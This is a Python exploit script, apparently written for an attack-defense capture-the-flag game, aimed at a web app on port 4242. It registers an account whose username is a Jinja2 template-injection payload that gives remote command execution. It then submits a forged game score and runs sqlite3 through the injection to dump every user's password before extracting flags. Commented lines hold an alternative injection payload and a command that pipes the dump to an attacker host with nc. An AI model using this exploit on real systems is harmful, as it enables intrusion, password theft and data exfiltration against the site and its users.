#!/usr/bin/env python3

import requests
import random
import string
import ua_generator
import re
import sys
import json


port = 4242
flag_regexp = re.compile(r'[A-Z0-9]{31}=')


class Hacker:
    def __init__(self, ip):
        self.host = f"http://{ip}:{port}"
        self.session = requests.Session()
        self.session.headers = {"User-agent": ua_generator.generate().text}

        random_string = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        self.username = '{{lipsum.__globals__.os.popen(request.args.cmd).read()}}'
        # self.username = f"{fake_username}{{{{news.__class__.__mro__[1].__subclasses__()[352](request.headers[request.method], shell=True, stdout=-1).communicate()}}}}"
        self.password = random_string

        self.register()
        self.login()


    def register(self) -> str:
        resp = self.session.post(
            self.host + "/register",
            data = {
                "username": self.username,
                "password": self.password
            }
        )
        return resp.text


    def login(self) -> str:
        resp = self.session.post(
            self.host + "/login",
            data = {
                "username":self.username,
                "password":self.password
            }
        )
        return resp.text


    def cheating(self):
        resp = self.session.post(
            self.host + "/score",
            json = {
                "game_id": 1,
                "score": 700,
                "time": 25
            }
        )
        return resp.text


    def RCEnews(self):
        resp = self.session.get(
            self.host + "/news.html?cmd=sqlite3 database.sqlite \"select password from Users;\"",
            # headers={'GET': f'sqlite3 database.sqlite "SELECT password FROM Users" | nc {attacker_ip} {attacker_port}'}
        )
        return resp.text


    def find_flags(self, text: str):
        print( flag_regexp.findall(text), flush=True )
            
    
def main():

    try:
        ip = sys.argv[1]
    except:
        print(f"USAGE:\t{sys.argv[0]} <victim-ip-address>")
        sys.exit(1)

    ssti = Hacker(ip)
    ssti.cheating()
    news = ssti.RCEnews()

    ssti.find_flags(news)

    

if __name__ == "__main__":
    main()